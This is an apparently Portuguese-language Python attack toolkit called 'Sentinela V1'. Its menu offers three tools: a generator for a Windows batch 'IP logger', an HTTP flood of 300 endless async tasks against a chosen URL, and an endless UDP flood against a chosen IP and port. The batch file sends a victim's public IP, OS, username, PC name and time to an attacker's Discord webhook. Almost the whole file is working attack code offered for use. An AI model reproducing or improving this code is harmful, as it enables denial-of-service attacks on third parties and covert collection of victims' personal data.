import aiohttp
import asyncio
import sys
import os
import socket
import requests
import colorama
from colorama import Fore, Style, init
import random

# ====================== CONFIGURAÇÕES ======================
init(convert=True, autoreset=True)
colorama.just_fix_windows_console()
os.system('cls' if os.name == 'nt' else 'clear')

# ====================== BANNER ======================
print(f"""{Fore.CYAN}
   ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗      █████╗ 
   ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║     ██╔══██╗
   ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║     ███████║
   ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║     ██╔══██║
   ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗██║  ██║
   ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}                        Sentinela V1 - by Crastnet4
{Style.RESET_ALL}
""")

# ====================== FUNÇÕES ======================

def limpar_tela():
    os.system('cls' if os.name == 'nt' else 'clear')

def build_ip_logger(webhook_url):
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        print(f"{Fore.RED}Webhook inválido.{Style.RESET_ALL}")
        return

    code = f"""@echo off
set webhook={webhook_url}
curl ifconfig.co > ip.txt
set /p ip=<ip.txt
del ip.txt
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"**IP:** %ip%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"**OS:** %os%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"**User:** %username%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"**PC Name:** %computername%\\"}}" %webhook%
curl --silent --output nul -X POST -H "Content-type: application/json" --data "{{\\"content\\": \\"**Time:** %date% %time%\\"}}" %webhook%
"""
    with open('Sentinela_IP_Logger.bat', 'w', encoding='utf-8') as f:
        f.write(code)
    print(f"{Fore.GREEN}✓ IP Logger criado: Sentinela_IP_Logger.bat{Style.RESET_ALL}")

async def ddos_real(url):
    global fetches
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                method = random.choice(["GET", "POST"])
                if method == "GET":
                    async with session.get(url) as r:
                        fetches += 1
                else:
                    async with session.post(url) as r:
                        fetches += 1
                sys.stdout.write(f"Requests: {fetches} | Method: {method}\r")
            except:
                pass

async def iniciar_ddose(url):
    limpar_tela()
    print(f"{Fore.CYAN}[+] DDoS iniciado em: {url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Enviando 300 tarefas infinitas...{Style.RESET_ALL}\n")
    tasks = [ddos_real(url) for _ in range(300)]
    await asyncio.gather(*tasks)

def ip_bomb_real(ip, port):
    limpar_tela()
    print(f"{Fore.CYAN}[+] IP Bomb iniciado em {ip}:{port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Enviando pacotes UDP infinitos...{Style.RESET_ALL}\n")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'Sentinela V1 - IP Bomb', (ip, port))
            s.close()
        except:
            pass

# ====================== MENU ======================
def menu():
    while True:
        limpar_tela()
        print(f"""{Fore.CYAN}
   ┌─────────────────────────────────────────────────────────────┐
   │                         SENTINELA                           │
   └─────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}
{Fore.WHITE}[1]{Fore.CYAN} IP Logger (Gerar .bat real)
{Fore.WHITE}[2]{Fore.CYAN} DDoS (300 tarefas infinitas)
{Fore.WHITE}[3]{Fore.CYAN} IP Bomb (UDP infinito)
{Fore.WHITE}[4]{Fore.RED} Sair{Style.RESET_ALL}
""")
        choice = input(f"{Fore.YELLOW}Escolha ==> {Style.RESET_ALL}")

        if choice == "1":
            limpar_tela()
            webhook = input(f"{Fore.CYAN}Webhook Discord: {Style.RESET_ALL}")
            build_ip_logger(webhook)
            input(f"\n{Fore.YELLOW}Pressione Enter...{Style.RESET_ALL}")

        elif choice == "2":
            limpar_tela()
            url = input(f"{Fore.CYAN}URL (com http/https): {Style.RESET_ALL}")
            if url:
                asyncio.run(iniciar_ddose(url))
            else:
                print(f"{Fore.RED}URL inválida.{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Pressione Enter...{Style.RESET_ALL}")

        elif choice == "3":
            limpar_tela()
            ip = input(f"{Fore.CYAN}IP alvo: {Style.RESET_ALL}")
            port = input(f"{Fore.CYAN}Porta (padrão 8080): {Style.RESET_ALL}") or "8080"
            try:
                port = int(port)
                ip_bomb_real(ip, port)
            except ValueError:
                print(f"{Fore.RED}Porta inválida.{Style.RESET_ALL}")
                input(f"\n{Fore.YELLOW}Pressione Enter...{Style.RESET_ALL}")

        elif choice == "4":
            print(f"\n{Fore.GREEN}Saindo...{Style.RESET_ALL}")
            sys.exit(0)

        else:
            print(f"{Fore.RED}Opção inválida.{Style.RESET_ALL}")
            input(f"\n{Fore.YELLOW}Pressione Enter...{Style.RESET_ALL}")

# ====================== EXECUÇÃO ======================
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}Encerrando...{Style.RESET_ALL}")
        sys.exit(0)
